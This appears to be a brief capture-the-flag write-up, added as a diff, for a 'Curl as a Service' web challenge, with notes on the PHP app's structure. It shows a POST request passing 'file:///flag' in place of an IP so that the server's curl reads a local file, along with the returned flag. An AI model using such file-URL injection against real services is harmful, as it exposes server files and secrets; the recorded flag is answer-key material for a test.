@@ -1,0 +1,21 @@
+Curl as a Service
+
+- docker container
+
+- index.php
+	- autoload register (?) controller and model php
+	- create new router object
+	- router new Get and Post 
+	- response= router match 
+
+
+curl -X POST -d 'ip=127.0.0.1' http://46.101.53.249:32435/api/curl
+
+response:
+{"message":["<html>","<head>","\t<meta charset=\"UTF-8\">","\t<title>Health Check<\/title>","\t<meta name=\"viewport\" content=\"width=device-width, initial-scale=1, user-scalable=no\">","\t<link rel=\"icon\" href=\"\/static\/images\/favicon.png\">","\t<link rel=\"stylesheet\" href=\"\/static\/css\/main.css\"\/>","    <link href=\"https:\/\/fonts.googleapis.com\/css?family=Inconsolata:400,700|VT323\" rel=\"stylesheet\">","<\/head>","<body>","    <div class=\"main\">","        <h1>Health Checker 9000<\/h1>","        <p>Verify the status of a host by specifying an IP address.<\/p>","        <div class=\"margin\"><\/div>","        <p class=\"green\">[root@localhost] # curl <input autofocus contenteditable=\"true\" id=\"command\"><\/input><\/p>","        <center><textarea id=\"console-output\" readonly><\/textarea><\/center>","    <\/div>","<\/body>","<script src=\"\/static\/js\/main.js\"><\/script>","<\/html>"]}     
+
+
+
+curl -X POST -d 'ip=file:///flag' http://46.101.53.249:32435/api/curl
+{"message":["CHTB{f1le_r3trieval_4s_a_s3rv1ce}"]}                                                                                                          
+
